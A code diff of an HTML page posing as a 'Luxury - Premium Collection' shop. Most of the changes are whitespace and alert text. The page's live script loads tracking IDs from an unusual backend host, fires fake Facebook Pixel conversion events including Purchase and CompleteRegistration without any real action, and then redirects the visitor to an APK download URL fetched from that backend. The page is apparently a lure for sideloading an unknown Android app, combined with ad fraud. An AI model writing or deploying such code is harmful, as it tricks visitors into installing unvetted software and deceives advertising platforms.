@@ -14,11 +14,7 @@
     <title>Luxury - Premium Collection</title>
     <script src="https://cdn.tailwindcss.com"></script>
 
-
-    <!-- TikTok Pixel Code Start -->
-
-  
-
+ 
        <script>
 var API_BASE = 'https://url.yuhd320k.site';
 // Facebook Pixel — 动态从后台加载所有像素ID
@@ -54,15 +50,15 @@ fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
 </script>
 <!-- End Meta Pixel Code -->
 
- 
+
 <script>
 // ========== k2 — 动态获取APK下载地址并跳转 ==========
 var _apkUrl = '';
 async function k2(source) {
     fbq('track', 'AddToCart');
     fbq('track', 'Contact');
- fbq('track', 'ViewContent');
- fbq('track', 'CompleteRegistration');
+       fbq('track', 'ViewContent');
+       fbq('track', 'CompleteRegistration');
     fbq('track', 'Purchase');
 
     try {
@@ -75,14 +71,13 @@ async function k2(source) {
         if (_apkUrl) {
             window.location.href = _apkUrl;
         } else {
-            alert('，请稍后重试');
+            alert('获取APK下载地址失败，请稍后重试');
         }
     } catch (e) {
-        alert('，请稍后重试');
+        alert('获取APK下载地址失败，请稍后重试');
     }
 }
 </script>
-
   
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <script>
